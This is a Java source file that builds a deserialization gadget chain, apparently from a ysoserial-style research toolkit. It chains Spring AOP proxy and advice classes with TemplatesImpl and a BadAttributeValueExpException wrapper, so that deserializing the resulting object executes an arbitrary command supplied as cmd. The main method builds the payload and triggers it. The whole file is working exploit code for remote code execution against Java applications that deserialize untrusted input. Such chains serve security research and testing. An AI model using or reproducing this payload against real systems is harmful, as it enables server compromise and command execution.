import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.aopalliance.aop.Advice;
import org.aopalliance.intercept.MethodInterceptor;
import org.springframework.aop.Advisor;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJExpressionPointcut;
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.framework.DefaultAdvisorChainFactory;
import org.springframework.aop.support.DefaultIntroductionAdvisor;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class SpringAOP1 {
    public static void main(String[] args) throws Throwable {
        SpringAOP1 aop1 = new SpringAOP1();
        Object object = aop1.getObject(Util.getDefaultTestCmd());
        Util.runGadgets(object);
//        String path = "/tmp/Deserialization/AOP1/aop1.ser";
//        Util.writeObj2File(object,path);
//        Util.readObj4File(path);
    }



    public Object getObject (String cmd) throws Throwable {
        AspectJAroundAdvice aspectJAroundAdvice = getAspectJAroundAdvice(cmd);
        InvocationHandler jdkDynamicAopProxy1 = (InvocationHandler) JdkDynamicAopProxyNode.makeGadget(aspectJAroundAdvice);
        Object proxy1 = Proxy.makeGadget(jdkDynamicAopProxy1, Advisor.class, MethodInterceptor.class);
        Advisor advisor = new DefaultIntroductionAdvisor((Advice) proxy1);
        List<Advisor> advisors = new ArrayList<>();
        advisors.add(advisor);
        AdvisedSupport advisedSupport = new AdvisedSupport();
        Reflections.setFieldValue(advisedSupport,"advisors",advisors);
        DefaultAdvisorChainFactory advisorChainFactory = new DefaultAdvisorChainFactory();
        Reflections.setFieldValue(advisedSupport,"advisorChainFactory",advisorChainFactory);
        InvocationHandler jdkDynamicAopProxy2 = (InvocationHandler) JdkDynamicAopProxyNode.makeGadget("ape1ron",advisedSupport);
        Object proxy2 = Proxy.makeGadget(jdkDynamicAopProxy2, Map.class);

        Object badAttrValExe = BadAttrValExeNode.makeGadget(proxy2);
        return badAttrValExe;
    }




    public AspectJAroundAdvice getAspectJAroundAdvice(String cmd) throws Exception {
        Object templatesImpl = TemplatesImplNode.makeGadget(cmd);
        SingletonAspectInstanceFactory singletonAspectInstanceFactory = new SingletonAspectInstanceFactory(templatesImpl);
        AspectJAroundAdvice aspectJAroundAdvice = Reflections.newInstanceWithoutConstructor(AspectJAroundAdvice.class);
        Reflections.setFieldValue(aspectJAroundAdvice,"aspectInstanceFactory",singletonAspectInstanceFactory);
        Reflections.setFieldValue(aspectJAroundAdvice,"declaringClass", TemplatesImpl.class);
        Reflections.setFieldValue(aspectJAroundAdvice,"methodName", "newTransformer");
        Reflections.setFieldValue(aspectJAroundAdvice,"parameterTypes", new Class[0]);
//        Method targetMethod = Reflections.getMethod(TemplatesImpl.class,"newTransformer",new Class[0]);
//        Reflections.setFieldValue(aspectJAroundAdvice,"aspectJAdviceMethod",targetMethod);

        AspectJExpressionPointcut aspectJExpressionPointcut = new AspectJExpressionPointcut();
        Reflections.setFieldValue(aspectJAroundAdvice,"pointcut",aspectJExpressionPointcut);
        Reflections.setFieldValue(aspectJAroundAdvice,"joinPointArgumentIndex",-1);
        Reflections.setFieldValue(aspectJAroundAdvice,"joinPointStaticPartArgumentIndex",-1);
        return aspectJAroundAdvice;
    }

}
